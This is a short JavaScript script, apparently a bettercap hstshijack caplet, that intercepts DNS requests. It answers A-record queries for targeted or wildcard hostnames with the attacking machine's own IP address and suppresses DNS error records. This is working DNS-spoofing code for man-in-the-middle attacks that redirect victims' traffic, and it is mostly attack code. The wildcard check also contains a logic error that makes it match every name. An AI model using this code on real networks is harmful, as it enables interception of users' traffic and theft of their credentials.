var addr = env("iface.ipv4");

var target_hosts = [];

var Rrtype = {
	None:  0,
	A:     1,
//	CNAME: 5,
//	AAAA:  28,
};

String.prototype.endsWith = function(suffix) {
	return this.slice(-1 * suffix.length) === suffix;
};

String.prototype.isTargeted = function() {
	for (a = 0; a < target_hosts.length; a++) {
		var target_host = target_hosts[a];
		if (target_host[0] === "*") {
			if (this.endsWith(target_host.slice(1)) + ".") return true;
			if (this.endsWith(target_host.slice(1))) return true;
		} else {
			if (this === target_host + ".") return true;
			if (this === target_host) return true;
		}
	}
	return false;
};

function onRequest(req, res) {
	req.Questions.forEach(function(question) {
		if (question.Qtype === Rrtype.A) {
			if (question.Name.isTargeted()) {
				res.Header.Response = true;
				res.Header.RecursionAvailable = true;
				res.Answers = res.Answers.concat({
					A: addr,
					Header: {
						Class: question.Qclass,
						Name: question.Name,
						Rrtype: question.Qtype,
						Ttl: 1,
					},
				});
			}
		}
		// Respond with AAAA records if necessary
	});

	if (res.Header.Response === true && res.Answers.length === 0) {
		res.Header.Rrtype = Rrtype.None;

		// Silence DNS errors by clearing all records
		res.Extras = [];
		res.Nameserver = [];
	}
}

function onLoad() {
	target_hosts = env["hstshijack.targets"].replace(/\s/g, "").split(",");
}
